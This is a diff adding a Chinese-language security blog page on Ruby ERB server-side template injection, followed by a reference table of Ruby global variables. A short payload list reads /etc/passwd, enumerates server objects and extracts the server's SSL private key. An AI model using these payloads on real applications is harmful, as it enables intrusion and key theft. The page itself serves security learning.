@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Y1Daa&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            Ruby ERB 模板注入
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h1><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.trustedsec.com/blog/rubyerb-template-injection/">https://www.trustedsec.com/blog/rubyerb-template-injection/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">https://www.anquanke.com/post/id/86867</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53142368/article/details/124000888">https://blog.csdn.net/qq_53142368/article/details/124000888</a></p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ERB为Ruby提供了一个模板系统。使用ERB，可以将实际的Ruby代码添加到任何纯文本文档中。</p>
+<p>具体用法如下：</p>
+<p><a target="_blank" rel="noopener" href="https://vimsky.com/examples/usage/ruby-ERB-class-ERB-rb.html">https://vimsky.com/examples/usage/ruby-ERB-class-ERB-rb.html</a></p>
+<p>可以利用ERB模板进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 写逻辑脚本(Ruby语法) %&gt;</span><br><span class="line">&lt;%= 直接输出变量值或运算结果 %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">template = <span class="string">&quot;text to be generated: &lt;%= x %&gt;&quot;</span></span><br><span class="line">erb_object = <span class="variable constant_">ERB</span>.new(template)</span><br><span class="line">x = <span class="number">7</span>*<span class="number">7</span></span><br><span class="line">puts erb_object.result(binding())</span><br></pre></td></tr></table></figure>
+
+<p>最后将得到49</p>
+<h2 id="一些可用payload"><a href="#一些可用payload" class="headerlink" title="一些可用payload"></a>一些可用payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= File.open(‘/etc/passwd’).read %&gt;</span><br><span class="line">&lt;%= self.class.name %&gt;	# 获取self对象的类名</span><br><span class="line">&lt;%= self.methods %&gt;		# 枚举self对象类的可用方法</span><br><span class="line">&lt;%= self.method(:handle_POST).parameters %&gt;</span><br><span class="line">&lt;%= session.class.name %&gt;</span><br><span class="line">&lt;%= self.instance_variables %&gt;</span><br><span class="line">&lt;%=@server.instance_variables %&gt;</span><br><span class="line">&lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;</span><br><span class="line">&lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="全局变量表"><a href="#全局变量表" class="headerlink" title="全局变量表"></a>全局变量表</h2><p><a target="_blank" rel="noopener" href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html</a></p>
+<table>
+<thead>
+<tr>
+<th>名字</th>
+<th>English库名</th>
+<th>中文释义</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$0</code></td>
+<td><code>$PROGRAM_NAME</code></td>
+<td>程序名字</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$*</code></td>
+<td><code>$ARGV</code></td>
+<td>参数值</td>
+<td>数组</td>
+</tr>
+<tr>
+<td><code>$:</code></td>
+<td>无</td>
+<td>库加载路径</td>
+<td>数组</td>
+</tr>
+<tr>
+<td><code>$?</code></td>
+<td><code>$CHILD_STATUS</code></td>
+<td>系统退出时，最后一个子进程的状态</td>
+<td>整数</td>
+</tr>
+<tr>
+<td><code>$&quot;</code></td>
+<td><code>$LOADED_FEATURES</code></td>
+<td>已加载的特性</td>
+<td>数组</td>
+</tr>
+<tr>
+<td><code>$$</code></td>
+<td><code>$PID</code>或<code>$PROCESS_ID</code></td>
+<td>进程号</td>
+<td>整数</td>
+</tr>
+<tr>
+<td><code>$!</code></td>
+<td><code>$ERROR_INFO</code></td>
+<td>错误信息</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$@</code></td>
+<td><code>$ERROR_POSITION</code></td>
+<td>错误发生的位置</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$&lt;</code></td>
+<td><code>$DEFUALT_INPUT</code></td>
+<td>默认输入值设备</td>
+<td>对象实例</td>
+</tr>
+<tr>
+<td><code>$&gt;</code></td>
+<td><code>$DEFAULT_OUTPUT</code></td>
+<td>默认输出设备</td>
+<td>对象实例</td>
+</tr>
+<tr>
+<td><code>$;</code></td>
+<td><code>$FS</code>或<code>$FILED_SEPARATOR</code></td>
+<td>默认字段分隔符，String.split方法会用到</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$,</code></td>
+<td><code>$OFS</code>或<code>$OUTPUT_FIELD_SEPARATOR</code></td>
+<td>输入字符串分隔符，连接多个字符串时用到</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$_</code></td>
+<td><code>$LAST_READ_LINE</code></td>
+<td>Kernel.puts或Kernel.readline从输入设备中读取的最后一行</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$.</code></td>
+<td><code>$NR</code>或<code>$INPUT_LINE_NUMBER</code></td>
+<td>当前所读取文件的最后行号</td>
+<td>整数</td>
+</tr>
+<tr>
+<td><code>$/</code></td>
+<td><code>$RS</code>或<code>INPUT_RECORD_SEPARATOR</code></td>
+<td>输入分隔符，即输入结束符</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$\</code></td>
+<td><code>$OFS</code>或&#96;&#96;$OUTPUT_RECORD_SEPARATOR&#96;</td>
+<td>多个Kernel.print或IO.write调用时，各个输出记录的分隔符</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$=</code></td>
+<td><code>$IGNORECASE</code></td>
+<td>匹配时是否忽略大小写，已经作废</td>
+<td>布尔</td>
+</tr>
+<tr>
+<td><code>$&amp;</code></td>
+<td><code>$MATCH</code></td>
+<td>匹配结果</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$1</code>~&#96;$9&#96;</td>
+<td>无</td>
+<td>各组匹配结果</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$~</code></td>
+<td><code>$LAST_MATCH_INFO</code></td>
+<td>最后一次匹配数据</td>
+<td>MatchData实例</td>
+</tr>
+<tr>
+<td><code>$+</code></td>
+<td><code>$LAST_PAREN_MATCH</code></td>
+<td>最后一个括号匹配内容</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td>$&#96;</td>
+<td><code>$PREMATCH</code></td>
+<td>最后一次匹配前的内容</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>$&#39;</code></td>
+<td><code>$POSTMATCH</code></td>
+<td>最后一次匹配后的内容</td>
+<td>字符串</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
